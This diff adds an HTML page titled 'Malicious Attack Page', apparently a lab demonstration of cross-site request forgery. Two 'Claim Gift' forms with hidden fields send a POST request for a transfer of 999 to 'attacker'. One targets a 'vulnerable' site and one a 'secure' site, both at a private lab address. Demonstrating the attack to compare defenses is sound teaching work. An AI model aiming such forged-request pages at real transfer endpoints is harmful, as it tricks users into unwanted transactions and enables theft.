@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malicious Attack Page</title>
+</head>
+<body>
+    <h2>Free Gift! from Vulnerable site - Click below!</h2>
+
+    <form action="http://192.168.18.73:8081/transfer.php" method="POST">
+        <input type="hidden" name="to" value="attacker">
+        <input type="hidden" name="amount" value="999">
+        <button type="submit">Claim Gift</button>
+    </form>
+
+<hr/>
+
+        <h2>Free Gift! from Secure site -  Click below!</h2>
+
+    <form action="http://192.168.18.73:8080/transfer.php" method="POST">
+        <input type="hidden" name="to" value="attacker">
+        <input type="hidden" name="amount" value="999">
+        <button type="submit">Claim Gift</button>
+    </form>
+</body>
+</html>
